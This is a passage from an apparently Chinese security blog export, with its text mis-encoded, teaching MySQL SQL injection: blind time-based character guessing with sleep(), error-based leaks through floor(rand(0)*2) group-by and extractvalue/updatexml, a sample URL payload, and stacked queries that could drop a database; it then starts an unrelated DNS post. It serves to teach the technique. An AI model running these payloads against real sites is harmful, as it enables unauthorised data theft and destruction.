title="èšåˆå‡½æ•°"></a>èšåˆå‡½æ•°</h3><ol><li><p><strong>COUNT()</strong></p><ul><li><p>ç»Ÿè®¡è¡Œæ•°æˆ–é NULL å€¼çš„æ•°é‡ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- ç»Ÿè®¡æ€»è¡Œæ•°ï¼ˆåŒ…æ‹¬NULLï¼‰<br>select count(*) from orders;<br><br>-- ç»Ÿè®¡æŸåˆ—éNULLå€¼çš„æ•°é‡<br>select count(product_id) from products;<br><br>-- ç»Ÿè®¡å”¯ä¸€å€¼æ•°é‡<br>select count(distinct user_id) from logs;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>SUM()</strong></p><ul><li><p>è®¡ç®—æ•°å€¼åˆ—çš„æ€»å’Œï¼ˆå¿½ç•¥ NULLï¼‰ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sun(revenue) from sales;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>AVG()</strong></p><ul><li><p>è®¡ç®—æ•°å€¼åˆ—çš„å¹³å‡å€¼ï¼ˆå¿½ç•¥ NULLï¼‰ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select avg(score) from exams;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>MAX()</strong> å’Œ <strong>MIN()</strong></p><ul><li><p>è¿”å›åˆ—ä¸­çš„æœ€å¤§&#x2F;æœ€å°å€¼ï¼ˆæ”¯æŒæ•°å€¼ã€æ—¥æœŸã€å­—ç¬¦ä¸²ï¼‰ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select max(temperature), min(temperature) from weather;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="å…¶ä»–å‡½æ•°"><a href="#å…¶ä»–å‡½æ•°" class="headerlink" title="å…¶ä»–å‡½æ•°"></a>å…¶ä»–å‡½æ•°</h3><ul><li><p>greatestï¼š</p><ul><li><p>è¿”å› a, b ä¸­æœ€å¤§çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">greatest(a, b)<br></code></pre></td></tr></table></figure><ul><li>aã€bï¼šä»»æ„å€¼</li></ul></li></ul></li><li><p>randï¼š</p><ul><li><p>è¿”å› 0~1 ä¹‹é—´éšæœºçš„æµ®ç‚¹å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">rand(a)<br></code></pre></td></tr></table></figure><ul><li>aï¼šå¯é€‰å‚æ•°ï¼›éšæœºæ•°ç§å­ï¼›å¯ä¸ºä»»æ„å€¼</li></ul></li></ul></li><li><p>load_file</p><ul><li><p>è¯»å–æ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">load_file(path)<br></code></pre></td></tr></table></figure><ul><li>pathï¼šæ–‡ä»¶è·¯å¾„ï¼Œä¸€èˆ¬è½¬ä¸º 16 è¿›åˆ¶é˜²æ­¢ç‰¹æ®Šå­—ç¬¦å‡ºé—®é¢˜</li></ul></li></ul></li><li><p>extractvalue</p><ul><li><p>å¯¹ XML æ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">extractvalue(xmlfileï¼Œpath)<br></code></pre></td></tr></table></figure><ul><li>xmlfileï¼šxml æ–‡ä»¶</li><li>pathï¼šxpath</li></ul></li></ul></li><li><p>updatexml</p><ul><li><p>æ›´æ–° xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(xmlfileï¼Œpath, content)<br></code></pre></td></tr></table></figure><ul><li>xmlfileï¼šxml æ–‡ä»¶</li><li>pathï¼šxpath</li><li>contentï¼šæ›´æ–°çš„å†…å®¹</li></ul></li></ul></li></ul><h2 id="æ³¨å…¥ç±»å‹"><a href="#æ³¨å…¥ç±»å‹" class="headerlink" title="æ³¨å…¥ç±»å‹"></a>æ³¨å…¥ç±»å‹</h2><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¤ä¹ äº†ä¸€ä¸‹ MySQL æ³¨å…¥ç›¸å…³çš„çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹æœ‰å“ªäº›ç±»å‹çš„æ³¨å…¥ã€‚</p><h3 id="å¸¸è§„æ³¨å…¥"><a href="#å¸¸è§„æ³¨å…¥" class="headerlink" title="å¸¸è§„æ³¨å…¥"></a>å¸¸è§„æ³¨å…¥</h3><p>æ³¨å…¥åç›´æ¥å›æ˜¾ç»“æœ</p><p>æœ‰ç‚¹å¤šå†™å¥½äº†è´´è¿™é‡Œ</p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>ç±»å‹</p><ul><li>å¸ƒå°”</li><li>æ—¶é—´</li><li>å…¶ä»–ï¼ˆæŠ¥é”™ã€å“åº”ä»£ç ç­‰ç­‰ï¼‰</li></ul><p>ç›²æ³¨å°±æ˜¯åœ¨ sql æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œæ•°æ®æ— å›æ˜¾ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸï¼Œè¿™ä¸ªæ–¹æ³•ç§°ä¹‹ä¸ºç›²æ³¨ã€‚</p><p>ç›²æ³¨å®é™…ä¸Šæ˜¯æ ¹æ®æ‰§è¡ŒæˆåŠŸä¸å¤±è´¥çš„ç°è±¡ä¸åŒï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿè·å–åˆ°ä¿¡æ¯ã€‚æœ€ç®€å•çš„æ˜¯å¸ƒå°”å‹çš„ï¼Œé€šè¿‡æ¯”è¾ƒè¿ç®—ç¬¦æ¥è·å¾—ä¿¡æ¯ï¼Œæ¯”è¾ƒç»“æœè¦ä¹ˆæ˜¯ Trueï¼Œè¦ä¹ˆæ˜¯ Falseï¼Œä¸¤ç§è¿”å›çš„æ•°æ®ä¸åŒã€‚é‚£ä¹ˆå¦‚æœä¸ç®¡æ˜¯ True è¿˜æ˜¯ Falseï¼Œé¡µé¢è¿”å›çš„éƒ½ä¸€æ ·çš„è¯ï¼Œå°±åªèƒ½ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼ŒåŠ å…¥ç‰¹å®šçš„æ—¶é—´å‡½æ•°ï¼Œé€šè¿‡æ—¶é—´å·®æ¥åˆ¤æ–­æ³¨å…¥çš„è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚</p><p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œåªè¦æ³¨å…¥æˆåŠŸä¸å¤±è´¥çš„è¿”å›æ•°æ®ä¸åŒï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°æ•°æ®åº“çš„ä¿¡æ¯ã€‚è‡³äºè¿”å›çš„æ•°æ®åˆ°åº•æ€ä¹ˆä¸ªä¸åŒæ³•ï¼Œåˆ™æœ‰å¾ˆå¤šç§å¯èƒ½ã€‚</p><p>åˆ©ç”¨æ–¹å¼</p><ol><li><p>åŸºäºå¸ƒå°”<br>åˆ©ç”¨å­—ç¬¦ä¸²ç›¸å…³çš„å‡½æ•°ï¼Œé€ä¸ªå­—ç¬¦çŒœè§£éœ€è¦çš„ä¿¡æ¯å³å¯</p></li><li><p>åŸºäºæ—¶é—´</p><ul><li><p>åˆ©ç”¨ <code>if</code>ã€<code>case</code>ç­‰ä¸æ—¶å»¶å‡½æ•°æ­é…ï¼Œé€ä¸ªå­—ç¬¦çŒœè§£éœ€è¦çš„ä¿¡æ¯</p></li><li><p>åˆ©ç”¨å­—ç¬¦ä¸²æå‰ä¸å®šä½å°†å­—ç¬¦è½¬ä¸ºæ•°å­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;a&#x27;));<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;b&#x27;));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(locate(substr(user(), 1, 1), &#x27;r&#x27;));<br># å‡ºç°æ—¶å»¶ï¼Œä»£è¡¨ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º r<br></code></pre></td></tr></table></figure><p>åŒç†å¯ä»¥è·å–æ‰€æœ‰ä½æ•°ã€‚æ­¤æ³•æ— éœ€ if ç­‰æ¡ä»¶è¯­å¥ã€‚</p><p>åŒæ ·è¿˜å¯ä»¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;a&#x27;, 1));<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;b&#x27;, 1));<br>...<br>select * from users where user=&#x27;&#x27; or sleep(replace(substr(user(), 1, 1), &#x27;r&#x27;, 1));<br># å‡ºç°æ—¶å»¶ï¼Œä»£è¡¨ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º r<br></code></pre></td></tr></table></figure><p>åˆ¤æ–­é•¿åº¦ä¹Ÿå¯ä»¥è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;&#x27; or sleep(length(database())-1);<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-2);<br>...<br>select * from users where user=&#x27;&#x27; or sleep(length(database())-14);<br># æ²¡æœ‰æ—¶å»¶è¯´æ˜é•¿åº¦ä¸º 14<br></code></pre></td></tr></table></figure></li></ul><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>åˆ©ç”¨ MySQL çš„ä¸€äº›ç‰¹æ®Šè¯­æ³•è§¦å‘é”™è¯¯ï¼Œé”™è¯¯ä¸­å¸¸å¸¸å¸¦ç€ä¸€äº›æ•°æ®åº“ä¿¡æ¯ï¼Œä»è€Œé€ æˆä¿¡æ¯æ³„éœ²ï¼Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸è§çš„ payloadï¼š</p><blockquote><p>floor + rand + count + group by ç»„åˆæ‹³</p></blockquote><p>å…ˆè¯´ <code>group by</code>ã€‚å½“ <code>group by</code> ä¸èšåˆå‡½æ•°ï¼ˆè¿™é‡Œæ˜¯ countï¼‰ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼ŒMySQL ä¼šä¸ºæŸ¥è¯¢ç»“æœå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿçš„è¡¨ã€‚è¿™ä¸ªè¡¨ä½ å¯ä»¥æŒ‰ç…§ Python çš„é‡Œçš„å­—å…¸ç†è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp_table = &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸å­—å…¸ç±»ä¼¼ï¼Œè¿™ä¸ªä¸´æ—¶çš„è¡¨ä¸èƒ½åˆ›å»ºç›¸åŒçš„é”®ï¼Œå‡ºç°äº†å°±æŠ¥é”™ï¼›å¦‚æœå‡ºç°ç›¸åŒçš„å€¼ï¼Œåˆ™ç´¯åŠ ã€‚ä¸¾ä¾‹ï¼š<br>å‡å¦‚æŸ¥å‡ºäº†ä¸€ä¸ªæ–°çš„å€¼ aï¼Œé‚£ä¹ˆ MySQL å…ˆæ‰¾ä¸€ä¸‹ä¸´æ—¶è¡¨ä¸­æœ‰æ²¡æœ‰è¿™ä¸ª a é”®ï¼Œæœ‰çš„è¯æ›´æ–°å¯¹äºçš„å€¼ï¼›å¦åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„é”®ã€‚å¦‚æœåˆ›å»ºæ–°çš„é”®çš„æ—¶å€™å‘ç°å·²ç»å­˜åœ¨è¿™ä¸ªé”®äº†ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œåˆ›å»ºé”®çš„ä¹‹å‰æ˜æ˜æœ‰å¯¹é”®çš„å­˜åœ¨è¿›è¡Œåˆ¤æ–­ï¼Œä¸ºä»€ä¹ˆåˆ›å»ºçš„æ—¶å€™è¿˜ä¼šå‡ºç°å­˜åœ¨å‘¢ï¼Ÿå› ä¸ºåˆ¤æ–­çš„æ—¶å€™ MySQL ä¼šè¿›è¡Œä¸€æ¬¡æŸ¥è¯¢ï¼Œè€Œåˆ›å»ºçš„æ—¶å€™åˆä¼šæŸ¥ä¸€ä¸‹ï¼Œç›¸å½“äºé‡å¤æŸ¥äº† 2 æ¬¡ã€‚åˆå› ä¸º <code>rand</code> å‡½æ•°æ¯æ¬¡è¿è¡Œçš„ç»“æœä¸åŒï¼Œä¾¿å¯¼è‡´äº†åˆ¤æ–­ä¸åˆ›å»ºçš„é”®ä¼šä¸ä¸€è‡´çš„æƒ…å†µã€‚</p><p>å½“ç„¶ï¼Œ0~1 ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°ç»“æœå¤ªå¤šäº†ï¼Œéœ€è¦é™åˆ¶ä¸€ä¸‹æ¥æé«˜å‡ ç‡ï¼Œè¿™å°±æ˜¯ <code>floor(rand()*2)</code> çš„ä½œç”¨ï¼Œå°†éšæœºç»“æœé™åˆ¶ä¸º2ç§ï¼Œè¦ä¹ˆ 0 è¦ä¹ˆ 1ã€‚<br>ä¸¾ä¾‹è¯´æ˜ï¼Œå½“ <code>group by</code> + <code>floor(rand(0)*2)</code> çš„æ—¶å€™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select floor(rand(0)*2) from information_schema.tables limit 0, 5;<br>+------------------+<br>| floor(rand(0)*2) |<br>+------------------+<br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br>|                1 |<br>+------------------+<br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>ç»“æœè§£é‡Šï¼š</p><ol><li>ç¬¬ä¸€æ¬¡æŸ¥è¯¢ï¼Œéšæœºæ•°ä¸º 0ï¼Œ<code>group by</code> æ‹¿åˆ°é”® 0ï¼Œåˆ¤æ–­é”® 0 ä¸åœ¨ä¸´æ—¶è¡¨åï¼Œå°è¯•æ–°å»ºé”®ï¼Œè¿™æ—¶æ¶ˆè€—äº†ä¸€ä¸ªéšæœºæ•° 1ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å®é™…ä¸Šæ–°å»ºçš„é”®çš„æ˜¯ 1ã€‚</li><li>ç¬¬äºŒæ¬¡æŸ¥è¯¢ï¼Œéšæœºæ•°ä¸º 1ï¼Œ<code>group by</code> æ‹¿åˆ°é”® 1ï¼Œåˆ¤æ–­é”® 1 åœ¨ä¸´æ—¶è¡¨åï¼Œæ›´æ–°é”® 1 å¯¹åº”çš„å€¼ã€‚</li><li>ç¬¬ä¸‰æ¬¡æŸ¥è¯¢ï¼Œéšæœºæ•°ä¸º 0ï¼Œ<code>group by</code> æ‹¿åˆ°é”® 0ï¼Œåˆ¤æ–­é”® 0 ä¸åœ¨ä¸´æ—¶è¡¨åï¼Œå°è¯•æ–°å»ºé”®ï¼Œè¿™æ—¶æ¶ˆè€—äº†ä¸€ä¸ªéšæœºæ•° 1ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å®é™…ä¸Šæ–°å»ºçš„é”®çš„æ˜¯ 1ï¼Œä½†æ˜¯é”® 1å·²ç»å­˜åœ¨ï¼Œæ‰€ä»¥ MySQL æŠ¥é”™ï¼š<code>ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;</code></li></ol><p>éªŒè¯å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+----------+----------+<br>| id   | user     | password |<br>+------+----------+----------+<br>|    1 | admin    | admin    |<br>|    2 | root     | password |<br>|    3 | username | 123456   |<br>+------+----------+----------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br><br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œgroup by çš„æ¬¡æ•°ä¸åˆ—æ•°å¯†åˆ‡ç›¸å…³ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå°† <code>users</code> è¡¨æ”¹ä¸º 2åˆ—ï¼Œåˆ™ä¸ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users;<br>+------+-------+----------+<br>| id   | user  | password |<br>+------+-------+----------+<br>|    1 | admin | admin    |<br>|    2 | root  | password |<br>+------+-------+----------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>+----------+<br>| count(*) |<br>+----------+<br>|        2 |<br>+----------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>å‰©ä¸‹çš„ï¼Œå°±æ˜¯æ€ä¹ˆåˆ©ç”¨æŠ¥é”™å°†éœ€è¦çš„æ•°æ®å¸¦å‡ºæ¥ã€‚æŠ¥é”™ä¸­çš„ <code>1</code> å®é™…ä¸Šå°±æ˜¯ <code>floor(rand(0)*2)</code> çš„ç»“æœï¼Œæ‰€ä»¥åªéœ€è¦å°†æ•°æ®ä¸ <code>floor(rand(0)*2)</code> è¿æ¥èµ·æ¥å°±å¯ä»¥å¸¦å‡ºæ¥äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select count(*) from users group by concat((floor(rand(0)*2)), &quot;~&quot;,version());<br>ERROR 1062 (23000): Duplicate entry &#x27;1~5.7.24&#x27; for key &#x27;&lt;group_key&gt;&#x27;<br></code></pre></td></tr></table></figure><p>å®æˆ˜ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1 or 1 group by concat((floor(rand(0)*2)), &quot;~&quot;, version()) -- #<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">version() ä¹Ÿå¯ä»¥ä¸º group_concat( select è¯­å¥ )<br></code></pre></td></tr></table></figure><blockquote><p>xml</p></blockquote><p>åˆ©ç”¨ xml çš„ xpath è¯­æ³•é”™è¯¯æ¥æŠ¥é”™ã€‚</p><p><strong>extractvalue</strong>: extractvalue åœ¨æŸ¥ä¸åˆ°æ•°æ®çš„æ—¶å€™è¿”å›ç©ºï¼Œxpath è¯­æ³•é”™è¯¯çš„æ—¶å€™åˆ™ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/&#x27;);<br>+--------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/&#x27;) |<br>+--------------------------+<br>| 123                      |<br>+--------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;);<br>+---------------------------+<br>| extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;) |<br>+---------------------------+<br>|                           |<br>+---------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~&#x27;<br></code></pre></td></tr></table></figure><p><strong>updatexml</strong>ï¼šä¸ extractvalue ç±»ä¼¼ã€‚</p><p>æ³¨æ„ï¼Œè¿™ä¸¤ç§æŠ¥é”™æ³¨å…¥ï¼Œèƒ½å¤Ÿæå–çš„æœ€é•¿å­—ç¬¦ä¸²ä¸º 32 ä¸ªå­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br>mysql&gt; select updatexml(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;, &#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br></code></pre></td></tr></table></figure><p>~æ›¿æ¢ä¸ºselectè¯­å¥</p><p>å®æˆ˜ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and extractvalue(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;));<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id=1 and updatexml(&#x27;&#x27;, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;), &#x27;&#x27;); <br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>å…¶ä»–å‡½æ•°</p></blockquote><p>ä¸Šé¢è¿™å‡ ä¸ªä»…ä»…æ˜¯æ¯”è¾ƒå¸¸è§çš„å‡½æ•°ï¼Œå®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šä¸å¸¸è§çš„</p><h3 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h3><p>åˆ©ç”¨ <code>union</code> æ¥æ‹¼æ¥ select è¯­å¥ã€‚ä¸»è¦æ˜¯åˆ¤æ–­åˆ—æ•°ã€‚</p><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>MySQL è¯­å¥ä¸­çš„ <code>;</code> ä»£è¡¨ä¸€ä¸ªè¯­å¥ç»“æŸã€‚å¦‚æœ <code>;</code> ä¹‹åçš„è¯­å¥ä¹Ÿèƒ½æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‹¼æ¥ä»»æ„è¯­å¥ï¼ŒåŒ…æ‹¬<code>drop database</code>ã€‚</p><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlæ³¨å…¥</tag>
      
      <tag>ç›²æ³¨éªšæ“ä½œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS</title>
    <link href="/2025/01/27/%E8%AE%BADNS/"/>
    <url>/2025/01/27/%E8%AE%BADNS/</url>
    
    <content type="html"><![CDATA[<h1 id="DNSçš„èµ·æº"><a href="#DNSçš„èµ·æº" class="headerlink" title="DNSçš„èµ·æº"></a>DNSçš„èµ·æº</h1><p>å€ŸåŠ©aiä½¿ç”¨ä¸€ä¸ªæ•…äº‹æ¥è§£é‡ŠDNSçš„èµ·æºï¼š</p><h2 id="ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£"><a href="#ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£" class="headerlink" title="ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£"></a><strong>ç¬¬ä¸€ç« ï¼šæ··ä¹±çš„â€œç”µè¯ç°¿â€æ—¶ä»£</strong></h2><p>1980å¹´ä»£åˆï¼Œäº’è”ç½‘è¿˜åƒä¸€ä¸ªåˆšåˆšå…´èµ·çš„å°é•‡ï¼Œåå«â€œé˜¿å¸•é•‡â€ï¼ˆARPANETï¼‰ã€‚é•‡ä¸Šçš„å±…æ°‘ï¼ˆè®¡ç®—æœºï¼‰è™½ç„¶ä¸å¤šï¼Œä½†å½¼æ­¤é€šä¿¡å…¨é ä¸€æœ¬<strong>çº¸è´¨ç”µè¯ç°¿</strong>â€”â€”åä¸º <code>hosts.txt</code> çš„æ–‡ä»¶ã€‚<br>è¿™æœ¬ç”µè¯ç°¿ç”±é•‡ä¸Šçš„â€œç®¡ç†å‘˜çˆ·çˆ·â€ï¼ˆæ–¯å¦ç¦ç ”ç©¶é™¢çš„SRI-NICï¼‰æ‰‹å†™ç»´æŠ¤ï¼Œæ¯æ–°å¢ä¸€å°è®¾å¤‡ï¼Œçˆ·çˆ·å°±å¾—ç†¬å¤œæ›´æ–°ï¼Œå†æ´¾äººéª‘é©¬é€åˆ°æ¯æˆ·äººå®¶ã€‚<br>å¯éšç€é•‡å­æ‰©å¤§ï¼Œé—®é¢˜æ¥äº†ï¼š</p><ul><li>æ–°ä½æˆ·æš´å¢ï¼Œç”µè¯ç°¿è¶Šæ¥è¶Šåšï¼Œéª‘é©¬é€ä¹¦çš„é€Ÿåº¦èµ¶ä¸ä¸Šå˜åŒ–ã€‚</li><li>æœ‰äººå®¶åœ°å€æ”¹äº†ï¼Œé‚»å±…å´è¿˜åœ¨ç”¨æ—§ç”µè¯ç°¿ï¼Œä¿¡å…¨å¯„ä¸¢äº†ï¼</li><li>çˆ·çˆ·ç´¯å€’äº†ï¼Œå…¨é•‡é€šä¿¡æ¿’ä¸´ç˜«ç—ªâ€¦â€¦</li></ul><hr><h2 